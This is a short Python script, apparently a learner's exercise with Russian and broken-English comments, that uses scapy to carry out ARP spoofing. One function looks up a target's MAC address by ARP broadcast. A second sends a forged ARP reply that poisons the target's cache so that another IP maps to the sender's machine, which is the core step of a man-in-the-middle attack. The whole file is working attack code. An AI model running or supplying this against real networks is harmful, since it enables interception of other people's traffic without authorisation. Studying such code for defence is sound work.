import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #return two couple list
    
    return answered_list[0][1].hwsrc #Зачем тут hwsrc?





def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)    
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip) #op = 2 - sent a recieve? that me have that MAC
    scapy.send(packet)





